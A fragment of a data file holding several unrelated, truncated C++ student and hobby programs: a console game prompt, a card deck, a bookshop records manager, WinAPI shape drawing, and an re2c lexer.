change_color_rgb(135, 28, 76);\r\n    std:: cout << \"will play with directions keys on keyboard.\" << endl << endl;\r\n    reset_color(); \r\n    delay(500);\r\n\r\n    change_color_rgb(79, 191, 227);\r\n    std::cout << \"First player:\" << endl;\r\n    std::cout << \"Please enter the name(with less than 30 characters): \";\r\n    change_color_rgb(135, 28, 76);\r\n    std::cin.ignore();\r\n    std::cin.getline(input_name, 50);\r\n    int check_standard_name = is_name_standard(input_name, 1);\r\n    while(check_standard_name != 1){\r\n        if(check_standard_name == 2){\r\n            change_color_rgb(240, 26, 62);\r\n      ",
    "#include <iostream>\nusing namespace std;\n//double power(double T, int B) {\n//    double result = 1.0;\n//    if (B >= 0) {\n//        for (int i = 0; i < B; ++i) {\n//            result *= T;\n//        }\n//    }\n//    else {\n//        for (int i = 0; i < -B; ++i) {\n//            result /= T;\n//        }\n//    }\n//    return result;\n//}\n//int sum_in_range(int start, int end) {\n//    int sum = 0;\n//    int lower = (start < end) ? start : end;\n//    int upper = (start < end) ? end : start;\n//\n//    for (int i = lower; i <= upper; ++i) {\n//        sum += i;\n//    }\n//    return sum;\n//}\nvoid print_card(int rank, int suit) {\n    string ranks[] = { \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"J\", \"Q\", \"K\", \"A\" };\n    string suits[] = { \"Hearts\", \"Diamonds\", \"Clubs\", \"Spades\" };\n\n    cout << \"Card: \" << ranks[rank] << \" of \" << suits[suit] << endl;\n}\n\nint main() {\n    /*double T;\n    int B;\n\n    cout << \"Enter the base of the exponent: \";\n    cin >> T;\n    cout << \"Enter the exponent: \";\n    cin >> B;\n\n    double result = power(T, B);\n    cout << \"Result: \" << result << endl;*/\n    \n    /*int start, end;\n    cout << \"Enter the first integer: \";\n    cin >> start;\n    cout << \"Enter the second integer: \";\n    cin >> end;\n\n    int result = sum_in_range(start, end);\n    cout << \"The sum of numbers in the range between \" << start << \" and \" << end << \" is equal to: \" << result << endl;*/\n    {\n        int rank, suit;\n        cout << \"Enter rank of the card (0-12): \";\n        cin >> rank;\n        cout << \"Enter suit of the card (0-3): \";\n        cin >> suit;\n\n        if (rank >= 0 && rank <= 12 && suit >= 0 && suit <= 3) {\n            print_card(rank, suit);\n        }\n        else {\n            cout << \"Invalid input. Rank should be between 0 and 12, and suit should be between 0 and 3.\" << endl;\n        }\n\n    }\n\n    \n\n}",
    "#include \"deck.h\"\n#include <vector>\n#include <cstdlib>  // For std::rand()\n#include <iostream> // For std::cout and std::endl\nusing namespace std;  // Using the std namespace\n// Assuming the Card class has a constructor that takes 'rank' and 'suit'.\n// For example: Card::Card(char r, char s) : rank(r), suit(s) {}\n\n// Constructor to populate the deck with 52 standard playing cards\nDeck::Deck() {\n    const char suits[] = {'C', 'S', 'D', 'H'};\n    const char ranks[] = {'A','2', '3', '4', '5', '6', '7', '8', '9', 'T', 'J', 'Q', 'K'};\n\n    for (char suit : suits) {\n        for (char rank : ranks) {\n            cards.push_back(Card(rank, suit)); // Add a new card to the deck\n        }\n    }\n}\n\n// Shuffle the deck\nvoid Deck::shuffle() {\n    for (size_t i = 0; i < cards.size(); i++) {\n        int j = std::rand() % cards.size(); // Generate a random position\n        std::swap(cards[i], cards[j]); // Swap the current card with the card at position j\n    }\n}\n\n// Deal a card from the deck\nCard Deck::deal() {\n    if (cards.empty()) {\n        std::cout << \"Deck is empty!\" << std::endl;\n        // In a real application, you might want to handle this case more gracefully\n        return Card('0', '0'); // Return a placeholder card\n    }\n    Card dealtCard = cards.back(); // Get the last card\n    cards.pop_back(); // Remove the last card from the deck\n    return dealtCard; // Return the dealt card\n}\n\n// Display all cards in the deck\nvoid Deck::display() const {\n    int count = 0;\n  for (const Card& card : cards) {\n      if (card.getRank() == 'T') {\n        std::cout << \"10\" << card.getSuit() << \" \";\n      }\n      else {\n        std::cout << card.getRank() << card.getSuit() << \" \"; // \n        //Adjusted for Card\n      }\n      if ((count + 1) % 13 == 0) {\n        std::cout << std::endl;\n      }\n      \n      count += 1;\n      \n    }\n    std::cout << std::endl;\n}\n",
    "// C++ program to illustrate bookshop\r\n// management system using File Handling\r\n#include <fstream>\r\n#include <iostream>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\n// Bookshop Class\r\nclass bookshope {\r\npublic:\r\n\tvoid control_panel();\r\n\tvoid add_book();\r\n\tvoid show_book();\r\n\tvoid check_book();\r\n\tvoid update_book();\r\n\tvoid del_book();\r\n};\r\n\r\n// Function to display the menus\r\nvoid bookshope::control_panel()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout << \"\\n\\n\\t\\t\\t\\tCONTROL PANEL\";\r\n\tcout << \"\\n\\n1. ADD BOOK\";\r\n\tcout << \"\\n2. DISPLAY BOOKS\";\r\n\tcout << \"\\n3. CHECK PARTICULAR BOOK\";\r\n\tcout << \"\\n4. UPDATE BOOK\";\r\n\tcout << \"\\n5. DELETE BOOK\";\r\n\tcout << \"\\n6. EXIT\";\r\n}\r\n\r\n// Function to add book\r\nvoid bookshope::add_book()\r\n{\r\n\tsystem(\"cls\");\r\n\tfstream file;\r\n\tint no_copy;\r\n\tstring b_name, a_name, b_id;\r\n\tcout << \"\\n\\n\\t\\t\\t\\tADD BOOKS\";\r\n\tcout << \"\\n\\nBook ID : \";\r\n\tcin >> b_id;\r\n\tcout << \"\\nBook Name : \";\r\n\tcin >> b_name;\r\n\tcout << \"\\nAuthor Name : \";\r\n\tcin >> a_name;\r\n\tcout << \"\\nNo. of Books : \";\r\n\tcin >> no_copy;\r\n\r\n\t// Open file in append or\r\n\t// output mode\r\n\tfile.open(\"D:// book.txt\",\r\n\t\t\tios::out | ios::app);\r\n\tfile << \" \" << b_id << \" \"\r\n\t\t<< b_name << \" \" << a_name\r\n\t\t<< \" \" << no_copy << \"\\n\";\r\n\tfile.close();\r\n}\r\n\r\n// Function to display book\r\nvoid bookshope::show_book()\r\n{\r\n\tsystem(\"cls\");\r\n\tfstream file;\r\n\tint no_copy;\r\n\tstring b_name, b_id, a_name;\r\n\tcout << \"\\n\\n\\t\\t\\t\\t\\tAll BOOKS\";\r\n\r\n\t// Open the file in input mode\r\n\tfile.open(\"D:// book.txt\", ios::in);\r\n\tif (!file)\r\n\t\tcout << \"\\n\\nFile Opening Error!\";\r\n\telse {\r\n\r\n\t\tcout << \"\\n\\n\\nBook ID\\t\\tBook\"\r\n\t\t\t<< \"\\t\\tAuthor\\t\\tNo. of \"\r\n\t\t\t\t\"Books\\n\\n\";\r\n\t\tfile >> b_id >> b_name;\r\n\t\tfile >> a_name >> no_copy;\r\n\r\n\t\t// Till end of file is reached\r\n\t\twhile (!file.eof()) {\r\n\r\n\t\t\tcout << \" \" << b_id\r\n\t\t\t\t<< \"\\t\\t\" << b_name\r\n\t\t\t\t<< \"\\t\\t\" << a_name\r\n\t\t\t\t<< \"\\t\\t\" << no_copy\r\n\t\t\t\t<< \"\\n\\n\";\r\n\t\t\tfile >> b_id >> b_name;\r\n\t\t\tfile >> a_name >> no_copy;\r\n\t\t}\r\n\r\n\t\tsystem(\"pause\");\r\n\r\n\t\t// Close the file\r\n\t\tfile.close();\r\n\t}\r\n}\r\n\r\n// Function to check the book\r\nvoid bookshope::check_book()\r\n{\r\n\tsystem(\"cls\");\r\n\tfstream file;\r\n\tint no_copy, count = 0;\r\n\tstring b_id, b_name, a_name, b_idd;\r\n\r\n\tcout << \"\\n\\n\\t\\t\\t\\tCheck \"\r\n\t\t<< \"Particular Book\";\r\n\r\n\t// Open the file in input mode\r\n\tfile.open(\"D:// book.txt\", ios::in);\r\n\tif (!file)\r\n\t\tcout << \"\\n\\nFile Opening Error!\";\r\n\telse {\r\n\r\n\t\tcout << \"\\n\\nBook ID : \";\r\n\t\tcin >> b_idd;\r\n\t\tfile >> b_id >> b_name;\r\n\t\tfile >> a_name >> no_copy;\r\n\r\n\t\twhile (!file.eof()) {\r\n\r\n\t\t\tif (b_idd == b_id) {\r\n\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcout << \"\\n\\n\\t\\t\\t\\t\"\r\n\t\t\t\t\t<< \"Check Particular Book\";\r\n\t\t\t\tcout << \"\\n\\nBook ID : \"\r\n\t\t\t\t\t<< b_id;\r\n\t\t\t\tcout << \"\\nName : \"\r\n\t\t\t\t\t<< b_name;\r\n\t\t\t\tcout << \"\\nAuthor : \"\r\n\t\t\t\t\t<< a_name;\r\n\t\t\t\tcout << \"\\nNo. of Books : \"\r\n\t\t\t\t\t<< no_copy;\r\n\t\t\t\tcout << endl\r\n\t\t\t\t\t<< endl;\r\n\t\t\t\tcount++;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tfile >> b_id >> b_name;\r\n\t\t\tfile >> a_name >> no_copy;\r\n\t\t}\r\n\t\tsystem(\"pause\");\r\n\t\tfile.close();\r\n\t\tif (count == 0)\r\n\t\t\tcout << \"\\n\\nBook ID Not\"\r\n\t\t\t\t<< \" Found...\";\r\n\t}\r\n}\r\n\r\n// Function to update the book\r\nvoid bookshope::update_book()\r\n{\r\n\tsystem(\"cls\");\r\n\tfstream file, file1;\r\n\tint no_copy, no_co, count = 0;\r\n\tstring b_name, b_na, a_name;\r\n\tstring a_na, b_idd, b_id;\r\n\r\n\tcout << \"\\n\\n\\t\\t\\t\\tUpdate Book Record\";\r\n\tfile1.open(\"D:// book1.txt\",\r\n\t\t\tios::app | ios::out);\r\n\tfile.open(\"D:// book.txt\", ios::in);\r\n\r\n\tif (!file)\r\n\t\tcout << \"\\n\\nFile Opening Error!\";\r\n\telse {\r\n\r\n\t\tcout << \"\\n\\nBook ID : \";\r\n\t\tcin >> b_id;\r\n\t\tfile >> b_idd >> b_name;\r\n\t\tfile >> a_name >> no_copy;\r\n\r\n\t\t// Till end of file is reached\r\n\t\twhile (!file.eof()) {\r\n\t\t\tif (b_id == b_idd) {\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcout << \"\\t\\t\\t\\t\"\r\n\t\t\t\t\t<< \"Update Book Record\";\r\n\t\t\t\tcout << \"\\n\\nNew Book Name : \";\r\n\t\t\t\tcin >> b_na;\r\n\t\t\t\tcout << \"\\nAuthor Name : \";\r\n\t\t\t\tcin >> a_na;\r\n\t\t\t\tcout << \"\\nNo. of Books : \";\r\n\t\t\t\tcin >> no_co;\r\n\t\t\t\tfile1 << \" \" << b_id << \" \"\r\n\t\t\t\t\t<< b_na << \" \"\r\n\t\t\t\t\t<< a_na << \" \" << no_co\r\n\t\t\t\t\t<< \"\\n\\n\";\r\n\t\t\t\tcount++;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tfile1 << \" \" << b_idd\r\n\t\t\t\t\t<< \" \" << b_name\r\n\t\t\t\t\t<< \" \" << a_name\r\n\t\t\t\t\t<< \" \" << no_copy\r\n\t\t\t\t\t<< \"\\n\\n\";\r\n\t\t\tfile >> b_idd >> b_name;\r\n\t\t\tfile >> a_name >> no_copy;\r\n\t\t}\r\n\t\tif (count == 0)\r\n\t\t\tcout << \"\\n\\nBook ID\"\r\n\t\t\t\t<< \" Not Found...\";\r\n\t}\r\n\tcout << endl;\r\n\tsystem(\"pause\");\r\n\r\n\t// Close the files\r\n\tfile.close();\r\n\tfile1.close();\r\n\tremove(\"D:// book.txt\");\r\n\trename(\"D:// book1.txt\",\r\n\t\t\"D:// book.txt\");\r\n}\r\n\r\n// Function to delete book\r\nvoid bookshope::del_book()\r\n{\r\n\tsystem(\"cls\");\r\n\tfstream file, file1;\r\n\tint no_copy, count = 0;\r\n\tstring b_id, b_idd, b_name, a_name;\r\n\tcout << \"\\n\\n\\t\\t\\t\\tDelete a Book\";\r\n\r\n\t// Append file in output mode\r\n\tfile1.open(\"D:// book1.txt\",\r\n\t\t\tios::app | ios::out);\r\n\tfile.open(\"D:// book.txt\",\r\n\t\t\tios::in);\r\n\r\n\tif (!file)\r\n\t\tcout << \"\\n\\nFile Opening Error...\";\r\n\telse {\r\n\r\n\t\tcout << \"\\n\\nBook ID : \";\r\n\t\tcin >> b_id;\r\n\t\tfile >> b_idd >> b_name;\r\n\t\tfile >> a_name >> no_copy;\r\n\t\twhile (!file.eof()) {\r\n\r\n\t\t\tif (b_id == b_idd) {\r\n\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t",
    "\ufeff#include <iostream>\n#include <Windows.h>\nusing std::cin;\nusing std::cout;\nusing std::endl;\n\n//#define MIN_SIZE 50\n//#define MAX_SIZE 800\n//#define MIN_LINE_WIDTH 1\n//#define MAX_LINE_WIDTH 25\n//#define MAX_HORIZONTAL_RESOLUTION 800\n//#define MAX_VERTICAL_RESOLUTION 600\nnamespace MyGeometry//CTRL K + S\n{\n\tenum Color\n\t{\n\t\tRED = 0x000000FF,\n\t\tGREEN = 0x0000FF00,\n\t\tBLUE = 0x00FF0000,\n\t\tGREY = 0x00AAAAAA,\n\t\tYELLOW = 0x0000FFFF,\n\t};\n\tclass Shape\n\t{\n\tprotected://\u041d\u0430\u0440\u0443\u0448\u0435\u043d\u0438\u0435 \u0438\u043d\u043a\u0430\u043f\u0441\u0443\u043b\u044f\u0446\u0438\u0438\n\t\tstatic const int MIN_SIZE = 50;\n\t\tstatic const int MAX_SIZE = 800;\n\t\tstatic const int MIN_LINE_WIDTH = 1;\n\t\tstatic const int MAX_LINE_WIDTH = 25;\n\t\tstatic const int MAX_HORIZONTAL_RESOLUTION = 800;\n\t\tstatic const int MAX_VERTICAL_RESOLUTION = 600;\n\n\t\tunsigned int x;\n\t\tunsigned int y;\n\t\tunsigned int lineWidth;\n\t\tColor color;\n\tpublic:\n\n\t\tunsigned int getX() const\n\t\t{\n\t\t\treturn x;\n\t\t}\n\t\tunsigned int getY() const\n\t\t{\n\t\t\treturn y;\n\t\t}\n\t\tunsigned int getLineWidth() const\n\t\t{\n\t\t\treturn lineWidth;\n\t\t}\n\t\t//\u041c\u0438\u043d\u0438\u043c\u0443\u043c 50, \u043c\u0430\u043a\u0441\u0438\u043c\u0443\u043c 800\n\t\tunsigned int setSize(unsigned int size)\n\t\t{\n\t\t\treturn size < MIN_SIZE ? MIN_SIZE :\n\t\t\t\tsize > MAX_SIZE ? MAX_SIZE :\n\t\t\t\tsize;\n\t\t}\n\t\tvoid setX(unsigned int x)\n\t\t{\n\t\t\tthis->x = x < MAX_HORIZONTAL_RESOLUTION ? x : MAX_HORIZONTAL_RESOLUTION;\n\t\t}\n\t\tvoid setY(unsigned int y)\n\t\t{\n\t\t\tthis->y = y < MAX_VERTICAL_RESOLUTION ? y : MAX_VERTICAL_RESOLUTION;\n\t\t}\n\t\tvoid setLineWidth(unsigned int width)\n\t\t{\n\t\t\tif (width < MIN_LINE_WIDTH)\n\t\t\t{\n\t\t\t\twidth = MIN_LINE_WIDTH;\n\t\t\t}\n\t\t\tif (width > MAX_LINE_WIDTH)\n\t\t\t{\n\t\t\t\twidth = MAX_LINE_WIDTH;\n\t\t\t}\n\t\t\tlineWidth = width;\n\t\t}\n\t\t//ctors\n\t\tShape(unsigned int x, unsigned int y, Color color = GREY, unsigned int lineWidth = 5) : color(color)\n\t\t{\n\t\t\tsetX(x);\n\t\t\tsetY(y);\n\t\t\tsetLineWidth(lineWidth);\n\t\t}\n\t\tvirtual ~Shape()\n\t\t{\n\n\t\t}\n\t\tvirtual double getArea() const = 0;\n\t\tvirtual double getPerimeter() const = 0;\n\t\tvirtual void draw() const = 0;\n\t\tvirtual void info() const\n\t\t{\n\t\t\tcout << \"Area: \" << getArea() << endl\n\t\t\t\t<< \"Perimeter: \" << getPerimeter() << endl;\n\t\t\tdraw();\n\t\t}\n\t};\n\tclass Rectangle : public Shape\n\t{\n\t\tdouble width;\n\t\tdouble height;\n\tpublic:\n\t\tdouble getHeight() const\n\t\t{\n\t\t\treturn height;\n\t\t}\n\t\tdouble getWidth() const\n\t\t{\n\t\t\treturn width;\n\t\t}\n\t\tvoid setWidth(double width)\n\t\t{\n\t\t\tthis->width = setSize(width);\n\t\t}\n\t\tvoid setHeight(double height)\n\t\t{\n\t\t\tthis->height = setSize(height);\n\t\t}\n\t\t//ctors\n\t\tRectangle(double width, double height, unsigned int x, unsigned int y, Color color, unsigned int lineWidth) :\n\t\t\tShape(x, y, color, lineWidth)\n\t\t{\n\t\t\tsetWidth(width);\n\t\t\tsetHeight(height);\n\t\t}\n\t\t~Rectangle()\n\t\t{\n\n\t\t}\n\t\t//methods:\n\t\tdouble getArea() const override\n\t\t{\n\t\t\treturn width * height;\n\t\t}\n\t\tdouble getPerimeter() const override\n\t\t{\n\t\t\treturn (width + height) * 2;\n\t\t}\n\t\tvoid draw() const override\n\t\t{\n\t\t\t//HWND - handler to Window (\u0414\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u043e\u043a\u043d\u0430 \u043d\u0443\u0436\u0435\u043d \u0434\u043b\u044f \u0442\u043e\u0433\u043e, \u0447\u0442\u043e\u0431\u044b \u043e\u0431\u0440\u0430\u0449\u0430\u0442\u044c\u0441\u044f \u043a \u043e\u043a\u043d\u0443)\n\t\t\tHWND hwnd = GetConsoleWindow(); //\u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0434\u0435\u0441\u043a\u0440\u0438\u043f\u0442\u043e\u0440 \u043e\u043a\u043d\u0430 \u043a\u043e\u043d\u0441\u043e\u043b\u0438\n\t\t\t//\u0414\u043b\u044f \u0442\u043e\u0433\u043e, \u0447\u0442\u043e\u0431\u044b \u0440\u0438\u0441\u043e\u0432\u0430\u0442\u044c, \u043d\u0443\u0436\u0435\u043d \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442 \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u0430 (Device context), \u043e\u043d \u0435\u0441\u0442\u044c \u0443 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u043e\u043a\u043d\u0430\n\t\t\tHDC hdc = GetDC(hwnd);\n\t\t\t//hdc - \u044d\u0442\u043e \u0442\u043e, \u043d\u0430 \u0447\u0435\u043c \u043c\u044b \u0431\u0443\u0434\u0435\u043c \u0440\u0438\u0441\u043e\u0432\u0430\u0442\u044c.\n\t\t\t//\u0422\u0435\u043f\u0435\u0440\u044c \u043d\u0443\u0436\u043d\u043e \u0442\u043e, \u0447\u0435\u043c \u043c\u044b \u0431\u0443\u0434\u0435\u043c \u0440\u0438\u0441\u043e\u0432\u0430\u0442\u044c\n\t\t\tHPEN hPen = CreatePen(PS_SOLID, lineWidth, color);//\u041f\u0435\u043d \u0440\u0438\u0441\u0443\u0435\u0442 \u043a\u043e\u043d\u0442\u0443\u0440 \u0444\u0438\u0433\u0443\u0440\u044b\n\t\t\tHBRUSH hBrush = CreateSolidBrush(color);//\u041a\u0438\u0441\u0442\u044c \u0437\u0430\u043b\u0438\u0432\u0430\u0435\u0442 \u0444\u0438\u0433\u0443\u0440\u0443\n\t\t\t//\u0422\u0435\u043f\u0435\u0440\u044c \u043d\u0443\u0436\u043d\u043e \u0432\u044b\u0431\u0440\u0430\u0442\u044c, \u0447\u0435\u043c \u0438 \u043d\u0430 \u0447\u0435\u043c \u043c\u044b \u0431\u0443\u0434\u0435\u043c \u0440\u0438\u0441\u043e\u0432\u0430\u0442\u044c\n\t\t\tSelectObject(hdc, hPen);\n\t\t\tSelectObject(hdc, hBrush);\n\t\t\t::Rectangle(hdc, x, y, x + width, y + height);//\u0420\u0438\u0441\u0443\u0435\u043c \u0444\u0438\u0433\u0443\u0440\u0443 \u0441 \u0437\u0430\u0434\u0430\u043d\u043d\u044b\u043c\u0438 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430\u043c\u0438\n\t\t\t//\u0423\u0434\u0430\u043b\u044f\u0435\u043c \u0432\u0441\u0435 \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u044b \u0434\u043b\u044f \u0442\u043e\u0433\u043e, \u0447\u0442\u043e\u0431\u044b \u043e\u0441\u0432\u043e\u0431\u043e\u0434\u0438\u0442\u044c \u0440\u0435\u0441\u0443\u0440\u0441\u044b \u043c\u0430\u0448\u0438\u043d\u044b\n\t\t\tDeleteObject(hPen);\n\t\t\tDeleteObject(hBrush);\n\t\t\tReleaseDC(hwnd, hdc);\n\n\t\t}\n\t\tvoid info() const override\n\t\t{\n\t\t\tcout << typeid(*this).name() << endl;\n\t\t\tcout << \"\u0428\u0438\u0440\u0438\u043d\u0430: \" << width << endl;\n\t\t\tcout << \"\u0412\u044b\u0441\u043e\u0442\u0430: \" << height << endl;\n\t\t\tShape::info();//\u0422\u0443\u0442 \u0442\u043e\u0436\u0435 \u043f\u0440\u043e\u0438\u0441\u0445\u043e\u0434\u0438\u0442 \u0440\u0438\u0441\u043e\u0432\u0430\u043d\u0438\u0435, \u0432\u044b\u0437\u044b\u0432\u0430\u0442\u044c \u0434\u0440\u043e\u0443 \u0432 \u043c\u0435\u0439\u043d\u0435 \u043d\u0430 \u043d\u0430\u0434\u043e\n\t\t}\n\t};\n\tclass Square : public Rectangle\n\t{\n\tpublic:\n\t\tSquare(double side, unsigned int x, unsigned int y, Color color, unsigned int lineWidth) : Rectangle(side, side, x, y, color, lineWidth)\n\t\t{\n\n\t\t}\n\t};\n\tclass Circle : public Shape\n\t{\n\t\tstatic const double PI;\n\t\tdouble radius;\n\tpublic:\n\t\tvoid setRadius(double radius)\n\t\t{\n\t\t\tthis->radius = setSize(radius);\n\t\t}\n\t\tdouble getRadius() const\n\t\t{\n\t\t\treturn radius;\n\t\t}\n\t\tdouble getArea() const override\n\t\t{\n\t\t\treturn PI * radius * radius;\n\t\t}\n\t\tdouble getPerimeter() const override\n\t\t{\n\t\t\treturn 2 * PI * radius;\n\t\t}\n\t\tdouble getDiameter() const\n\t\t{\n\t\t\treturn 2 * radius;\n\t\t}\n\t\tvoid draw() const override\n\t\t{\n\t\t\tHWND hwnd = GetConsoleWindow();\n\t\t\tHDC hdc = GetDC(hwnd);\n\t\t\tHPEN pen = CreatePen(PS_SOLID, lineWidth, color);\n\t\t\tHBRUSH brush = CreateSolidBrush(color);\n\t\t\tSelectObject(hdc, pen);\n\t\t\tSelectObject(hdc, brush);\n\t\t\t::Ellipse(hdc, x, y, x + getDiameter(), y + getDiameter());\n\t\t\tDeleteObject(pen);\n\t\t\tDeleteObject(brush);\n\t\t\tReleaseDC(hwnd, hdc);\n\t\t}\n\t\tCircle(double radius, unsigned int x, unsigned int y, Color color, unsigned int lineWidth) : Shape(",
    "#include <slkc/compiler/ast/lexer.h>\n#include <algorithm>\n\nusing namespace slake::slkc;\n\nenum LexCondition {\n\tyycInitialCondition = 0,\n\n\tyycStringCondition,\n\tyycEscapeCondition,\n\n\tyycCommentCondition,\n\tyycLineCommentCondition,\n};\n\nvoid slake::slkc::Lexer::lex(std::string_view src) {\n\tconst char *YYCURSOR = src.data(), *YYMARKER = YYCURSOR, *YYLIMIT = src.data() + src.size();\n\tconst char *prevYYCURSOR = YYCURSOR;\n\n\tLexCondition YYCONDITION = yycInitialCondition;\n\n#define YYSETCONDITION(cond) (YYCONDITION = (yyc##cond))\n#define YYGETCONDITION() (YYCONDITION)\n\n\tstd::unique_ptr<Token> token;\n\n\twhile (true) {\n\t\tstd::string strLiteral;\n\n\t\ttoken = std::make_unique<Token>();\n\n\t\twhile (true) {\n\t\t\t/*!re2c\n\t\t\t\tre2c:yyfill:enable = 0;\n\t\t\t\tre2c:define:YYCTYPE = char;\n\n\t\t\t\t<InitialCondition>\"/*\"\t\t{ YYSETCONDITION(CommentCondition); token->tokenId = TokenId::Comment; continue; }\n\t\t\t\t<InitialCondition>\"//\"\t\t{ YYSETCONDITION(LineCommentCondition); token->tokenId = TokenId::Comment; continue; }\n\n\t\t\t\t<InitialCondition>\"::\"\t\t{ token->tokenId = TokenId::ScopeOp; break; }\n\t\t\t\t<InitialCondition>\"->\"\t\t{ token->tokenId = TokenId::WrapOp; break; }\n\t\t\t\t<InitialCondition>\"=>\"\t\t{ token->tokenId = TokenId::MatchOp; break; }\n\t\t\t\t<InitialCondition>\"&&\"\t\t{ token->tokenId = TokenId::LAndOp; break; }\n\t\t\t\t<InitialCondition>\"||\"\t\t{ token->tokenId = TokenId::LOrOp; break; }\n\t\t\t\t<InitialCondition>\"+\"\t\t{ token->tokenId = TokenId::AddOp; break; }\n\t\t\t\t<InitialCondition>\"-\"\t\t{ token->tokenId = TokenId::SubOp; break; }\n\t\t\t\t<InitialCondition>\"*\"\t\t{ token->tokenId = TokenId::MulOp; break; }\n\t\t\t\t<InitialCondition>\"/\"\t\t{ token->tokenId = TokenId::DivOp; break; }\n\t\t\t\t<InitialCondition>\"%\"\t\t{ token->tokenId = TokenId::ModOp; break; }\n\t\t\t\t<InitialCondition>\"&\"\t\t{ token->tokenId = TokenId::AndOp; break; }\n\t\t\t\t<InitialCondition>\"|\"\t\t{ token->tokenId = TokenId::OrOp; break; }\n\t\t\t\t<InitialCondition>\"^\"\t\t{ token->tokenId = TokenId::XorOp; break; }\n\t\t\t\t<InitialCondition>\"!\"\t\t{ token->tokenId = TokenId::LNotOp; break; }\n\t\t\t\t<InitialCondition>\"~\"\t\t{ token->tokenId = TokenId::NotOp; break; }\n\t\t\t\t<InitialCondition>\"=\"\t\t{ token->tokenId = TokenId::AssignOp; break; }\n\t\t\t\t<InitialCondition>\"+=\"\t\t{ token->tokenId = TokenId::AddAssignOp; break; }\n\t\t\t\t<InitialCondition>\"-=\"\t\t{ token->tokenId = TokenId::SubAssignOp; break; }\n\t\t\t\t<InitialCondition>\"*=\"\t\t{ token->tokenId = TokenId::MulAssignOp; break; }\n\t\t\t\t<InitialCondition>\"/=\"\t\t{ token->tokenId = TokenId::DivAssignOp; break; }\n\t\t\t\t<InitialCondition>\"%=\"\t\t{ token->tokenId = TokenId::ModAssignOp; break; }\n\t\t\t\t<InitialCondition>\"&=\"\t\t{ token->tokenId = TokenId::AndAssignOp; break; }\n\t\t\t\t<InitialCondition>\"|=\"\t\t{ token->tokenId = TokenId::OrAssignOp; break; }\n\t\t\t\t<InitialCondition>\"^=\"\t\t{ token->tokenId = TokenId::XorAssignOp; break; }\n\t\t\t\t<InitialCondition>\"~=\"\t\t{ token->tokenId = TokenId::NotAssignOp; break; }\n\t\t\t\t<InitialCondition>\"<<=\"\t\t{ token->tokenId = TokenId::LshAssignOp; break; }\n\t\t\t\t<InitialCondition>\">>=\"\t\t{ token->tokenId = TokenId::RshAssignOp; break; }\n\t\t\t\t<InitialCondition>\"===\"\t\t{ token->tokenId = TokenId::StrictEqOp; break; }\n\t\t\t\t<InitialCondition>\"!==\"\t\t{ token->tokenId = TokenId::StrictNeqOp; break; }\n\t\t\t\t<InitialCondition>\"==\"\t\t{ token->tokenId = TokenId::EqOp; break; }\n\t\t\t\t<InitialCondition>\"!=\"\t\t{ token->tokenId = TokenId::NeqOp; break; }\n\t\t\t\t<InitialCondition>\"<<\"\t\t{ token->tokenId = TokenId::LshOp; break; }\n\t\t\t\t<InitialCondition>\">>\"\t\t{ token->tokenId = TokenId::RshOp; break; }\n\t\t\t\t<InitialCondition>\"<=\"\t\t{ token->tokenId = TokenId::LtEqOp; break; }\n\t\t\t\t<InitialCondition>\">=\"\t\t{ token->tokenId = TokenId::GtEqOp; break; }\n\t\t\t\t<InitialCondition>\"<\"\t\t{ token->tokenId = TokenId::LtOp; break; }\n\t\t\t\t<InitialCondition>\">\"\t\t{ token->tokenId = TokenId::GtOp; break; }\n\t\t\t\t<InitialCondition>\"$\"\t\t{ token->tokenId = TokenId::DollarOp; break; }\n\n\t\t\t\t<InitialCondition>\"as\"\t\t\t{ token->tokenId = TokenId::AsKeyword; break; }\n\t\t\t\t<InitialCondition>\"async\"\t\t{ token->tokenId = TokenId::AsyncKeyword; break; }\n\t\t\t\t<InitialCondition>\"await\"\t\t{ token->tokenId = TokenId::AwaitKeyword; break; }\n\t\t\t\t<InitialCondition>\"base\"\t\t{ token->tokenId = TokenId::BaseKeyword; break; }\n\t\t\t\t<InitialCondition>\"break\"\t\t{ token->tokenId = TokenId::BreakKeyword; break; }\n\t\t\t\t<InitialCondition>\"case\"\t\t{ token->tokenId = TokenId::CaseKeyword; break; }\n\t\t\t\t<InitialCondition>\"catch\"\t\t{ token->tokenId = TokenId::CatchKeyword; break; }\n\t\t\t\t<InitialCondition>\"class\"\t\t{ token->tokenId = TokenId::ClassKeyword; break; }\n\t\t\t\t<InitialCondition>\"continue\"\t{ token->tokenId = TokenId::ContinueKeyword; break; }\n\t\t\t\t<InitialCondition>\"delete\"\t\t{ token->tokenId = TokenId::DeleteKeyword; break; }\n\t\t\t\t<InitialCondition>\"default\"\t\t{ token->tokenId = TokenId::DefaultKeyword; break; }\n\t\t\t\t<InitialCondition>\"else\"\t\t{ token->tokenId = TokenId::ElseKeyword; break; }\n\t\t\t\t<InitialCondition>\"enum\"\t\t{ token->tokenId = TokenId::EnumKeyword; break; }\n\t\t\t\t<InitialCondition>\"false\"\t\t{ token->tokenId = TokenId::FalseKeyword; break; }\n\t\t\t\t<InitialCondition>\"fn\"\t\t\t{ token->tokenId =",
